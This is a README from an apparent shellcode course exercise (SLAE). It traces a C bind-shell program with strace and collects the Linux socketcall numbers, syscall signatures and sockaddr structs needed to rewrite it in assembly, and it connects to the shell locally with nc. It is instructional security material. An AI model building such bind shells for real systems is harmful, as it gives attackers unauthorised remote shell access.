exercise1/README.org
** Analysis of the C program

We can use a tool called ~strace~ to help us learn more about what system calls
our bind shell c program is making. Running ~strace ./bindshell~, connecting
to the bindshell with ~nc -nv 127.0.0.1 4444~ and filtering out the noise
we will see:

#+Name: strace-bindshell
#+BEGIN_SRC sh
root@blahblah:~/shared/SLAE/slae/exercise1# strace ./bindshell
execve("./bindshell", ["./bindshell"], [/* 41 vars */]) = 0
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 0)                            = 0
accept(3,
dup2(4, 0)                              = 0
dup2(4, 1)                              = 1
dup2(4, 2)                              = 2
execve("/bin/sh", [0], [/* 0 vars */])  = 0
#+END_SRC

Ok. It looks like our code makes some system calls that seem to align with the
functions we know to be part of our socket programming formula along with the
stdin, stdout, and stderror redirection and our ~execve~ call to run /bin/sh.

Lets lookup the system calls to find out their system call numbers. We will
consult ~/usr/include/i386-linux-gnu/asm/unistd_32.h~ for these numbers...

When we consult the listing of syscalls we encounter a bit of confusion. The
only system calls that seem to closely match up with what we saw in our strace
are:

#+Name: syscall-numbers
#+BEGIN_SRC c
#define __NR_execve 11
#define __NR_dup2 63
#define __NR_socketcall 102
#define __NR_mbind 274
#+END_SRC

This is strange. ~execve~ and ~dup2~ look good but there doesn't seem to be
any syscall numbers for socket,listen, or accept. socketcall seems a bit odd
as does mbind so we will have to look into this.

Consulting ~man socketcall~ we learn:

#+Name: man-socketcall
#+BEGIN_SRC c
int socketcall(int call, unsigned long *args);

/**
socketcall() is a common kernel entry point for the socket system
calls.  call determines which socket function to invoke.  args points
to a block containing the actual arguments, which are passed through
to the appropriate call.

User programs should call the appropriate functions by their usual
names.  Only standard library implementors and kernel hackers need to
know about socketcall().
**/

#+END_SRC

So that seems to explain things a little bit. The first argument to
socketcall is a number that represents the actual socket api function
that we want to be calling. Ok... Where do we get the number associated
with each of the api calls?

A little Google search for socketcall call numbers brings us:

[[http://jkukunas.blogspot.com/2010/05/x86-linux-networking-system-calls.html][socketcall call numbers]]

In this blog post we confirm our knowledge about the first argument of
socketcall as well as learn about ~/usr/include/linux/net.h~

Lets checkout that file and see if we can learn the numbers we are looking
for.

#+Name: net.h
#+BEGIN_SRC c
#define SYS_SOCKET	1		/* sys_socket(2)		*/
#define SYS_BIND	  2		/* sys_bind(2)			*/
#define SYS_LISTEN	4		/* sys_listen(2)		*/
#define SYS_ACCEPT	5		/* sys_accept(2)		*/
// ... snip
#+END_SRC

So it looks like the ~mbind~ syscall we saw earlier might not be
necessary as it looks like there is a ~bind~ syscall number that we
can call with ~socketcall~.  We'll try that out and see how that goes.

Now that we know the syscalls and their corresponding numbers, we need
to figure out their function signatures so that we know what sort of
arguments we need to be passing to them when we invoke them. The
metnod signatures look like the following:


#+Name: signatures
#+BEGIN_SRC c
int socketcall(int call, unsigned long *args);
int socket(int domain, int type, int protocol);
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
int listen(int sockfd, int backlog);
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
int dup2(int oldfd, int newfd);
int execve(const char *filename, char *const argv[], char *const envp[]);
// ... snip
#+END_SRC

We also leveraged 2 structs in our C program which we will most likely need
to replicate.

#+Name: netinet/in.h
#+BEGIN_SRC c
#include <netinet/in.h>

// All pointers to socket address structures are often cast to pointers
// to this type before use in various functions and system calls:

struct sockaddr {
    unsigned short    sa_family;    // address family, AF_xxx
    char              sa_data[14];  // 14 bytes of protocol address
};


// IPv4 AF_INET sockets:

struct sockaddr_in {
    short            sin_family;   // e.g. AF_INET, AF_INET6
    unsigned short   sin_port;     // e.g. htons(3490)
    struct in_addr   sin_addr;     // see struct in_addr, below
    char             sin_zero[8];  // zero this if you want to
};

#+END_SRC


Ok... Using what we have gathered from our analysis lets take an attempt at
writing some assembly!

